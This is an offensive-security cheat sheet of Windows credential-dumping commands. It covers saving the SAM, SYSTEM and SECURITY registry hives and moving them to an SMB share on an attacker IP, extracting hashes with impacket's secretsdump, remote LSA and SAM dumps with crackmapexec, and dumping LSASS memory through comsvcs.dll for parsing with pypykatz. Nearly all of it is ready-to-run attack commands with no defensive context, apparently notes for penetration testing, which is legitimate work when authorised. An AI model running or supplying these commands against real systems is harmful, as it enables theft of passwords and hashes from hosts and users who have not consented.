# Windows - Exploitation tips

% windows

## Manual SAM db dumping
```
# copy registry hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# create a share with smbserver.py
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <SHARENAME> <PATH TO FOLDER>

# Move hive copies to share
move <FILE> \\<ATK IP>\<SHARENAME>

# dump hashes with secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# if necessary, crack hashes
```

## Remote LSA dumping
```
# Remote LSA dump
crackmapexec smb <TARGET IP> --local-auth -u <USER> -p <PASSWORD> --lsa
```

## Remote SAM dumping
```
# Remote SAM dump

crackmapexec smb <TARGET IP> --local-auth -u <USER> -p <PASSWORD> --sam
```

## LSASS dumping
```
# dumping LSASS
# 1. Find lsass.exe pid
# CMD
tasklist /svc
# Pwsh
Get-Process lsass

# 2. Create a dump, pwsh
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# 3. Pypykatz to extract creds
pypykatz lsa minidump <PATH/TO/DUMP>

# 4. Look at the MSV? WDIGEST, KERBEROS, DPAPI sections
# 5. Crack if necssary
```
